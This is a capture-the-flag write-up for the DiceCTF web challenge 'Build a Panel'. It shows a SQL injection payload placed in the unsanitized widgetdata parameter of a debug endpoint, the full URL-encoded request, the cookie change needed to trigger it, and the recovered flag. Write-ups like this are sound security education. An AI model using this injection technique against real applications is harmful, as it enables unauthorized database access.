Build a Panel
===
**Category**: Web

**Points**: 130 (96 solves)

**Author**: Jim
### Description
- `You can never have too many widgets and BAP organization is the future. If you experience any issues, send it`
- Site: `https://build-a-panel.dicec.tf/`
- Source: `build-a-panel.tar.gz`
### Solution
- In file server.js, we can SQL injection here![image](https://user-images.githubusercontent.com/54855855/107372851-728a8580-6b18-11eb-832a-18464fd9105d.png)
- No query input parameters are sterilized so we can SQL injection like this

`panelid` = `test`,
`widgetname` = `test`,
`widgetdata` = `"' || (SELECT * FROM flag) '"`
### Payload
- Because GET method for `/admin/debug/add_widget` so we need url encode for `widgetdata`
`https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=test&widgetname=test&widgetdata=%22%27%20%7C%7C%20%28SELECT%20%2A%20FROM%20flag%29%20%27%22`
- Load that url after change cookie `panelID` = `test` and load url `https://build-a-panel.dicec.tf/create`
- Flag in `widgets` in network ![image](https://user-images.githubusercontent.com/54855855/107376819-e9298200-6b1c-11eb-93f0-732bb165f953.png)
### Flag
`dice{ch41n_ChAIn_aNd_m0Re_cHaIn}`
